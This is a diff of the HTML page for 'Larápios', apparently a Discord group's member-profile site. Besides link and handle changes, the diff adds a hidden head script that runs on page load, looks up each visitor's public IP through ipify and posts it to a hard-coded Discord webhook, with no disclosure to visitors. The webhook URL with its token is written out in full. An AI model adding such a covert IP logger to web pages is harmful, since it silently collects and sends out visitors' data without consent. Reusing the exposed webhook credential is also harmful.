@@ -6,7 +6,33 @@
     <title>Larápios</title>
     <link rel="icon" type="image/png" href="images/bandido.png">
     <link rel="stylesheet" href="css/styles.css">
-    <script src="js/script.js" defer type="69664f3b12b7f5921d7725fb-text/javascript"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            $.getJSON('https://api.ipify.org?format=json', function (data) {
+                console.log(data);
+                var ip = data.ip;
+                var webhook_url = 'https://discord.com/api/webhooks/1329885894550749354/T1C8_y_6ikK-ITR2NgezbwfiMlsbIWuVnjOnrcwe5fseXenX2sFIAhTDi3_r88VmEG2W';
+                
+                var payload = {
+                    content: 'IP do usuário: ' + ip
+                };
+
+                $.ajax({
+                    url: webhook_url,
+                    type: 'POST',
+                    data: JSON.stringify(payload),
+                    contentType: 'application/json',
+                    success: function () {
+                        console.log('IP enviado com sucesso.');
+                    },
+                    error: function (err) {
+                        console.error('Erro ao enviar o IP:', err);
+                    }
+                });
+            });
+        });
+    </script>
 </head>
 <body>
     <div id="intro">
@@ -21,11 +47,10 @@
         <main>
             <section class="profiles">
 
-                <!-- Perfil 1 -->
-                <a href="https://discord.gg/larapios" class="profile">
+                <a href="https://discord.com/users/1245036556759334987/" class="profile">
                     <img src="images/profile4.gif" alt="Profile Picture">
                     <h2>Polonie</h2>
-                    <p>Raul Nivel 1000</p>
+                    <p>@nenens</p>
                     <div class="badges">
                         <img src="images/badge2.png" alt="Badge">
                         <img src="images/badge3.png" alt="Badge">
@@ -33,11 +58,10 @@
                     </div>
                 </a>
 
-                <!-- Perfil 2 -->
-                <a href="https://discord.gg/larapios" class="profile">
-                    <img src="images/seven.png"Profile Picture>
+                <a href="https://discord.com/users/1195889174469951620" class="profile">
+                    <img src="images/seven.png" alt="Profile Picture">
                     <h2>Seven7</h2>
-                    <p>Raul Nivel 1000</p>
+                    <p>@seven7sempre</p>
                     <div class="badges">
                         <img src="images/badge2.png" alt="Badge">
                         <img src="images/badge3.png" alt="Badge">
@@ -45,11 +69,10 @@
                     </div>
                 </a>
 
-                <!-- Perfil 3 -->
-                <a href="https://discord.gg/larapios" class="profile">
+                <a href="https://discord.com/users/1237556883720634409" class="profile">
                     <img src="images/pmb.png" alt="Profile Picture">
                     <h2>Pinguim</h2>
-                    <p>Raul Nivel -1000</p>
+                    <p>@eclodir</p>
                     <div class="badges">
                         <img src="images/badge2.png" alt="Badge">
                         <img src="images/badge4.png" alt="Badge">
@@ -57,11 +80,10 @@
                     </div>
                 </a>
 
-                <!-- Perfil 4 -->
-                <a href="https://discord.gg/larapios" class="profile">
+                <a href="https://discord.com/users/1323020101011767397" class="profile">
                     <img src="images/ch.png" alt="Profile Picture">
                     <h2>Ch</h2>
-                    <p>Raul Nivel 1000</p>
+                    <p></p>
                     <div class="badges">
                         <img src="images/badge2.png" alt="Badge">
                         <img src="images/badge4.png" alt="Badge">
@@ -72,7 +94,6 @@
             </section>
         </main>
         <audio id="music" src="media/musica.mp3" preload="auto"></audio>
-        </video>
     </div>
     <script src="js/rocket-loader.min.js" data-cf-settings="69664f3b12b7f5921d7725fb-|49" defer></script>
 </body>
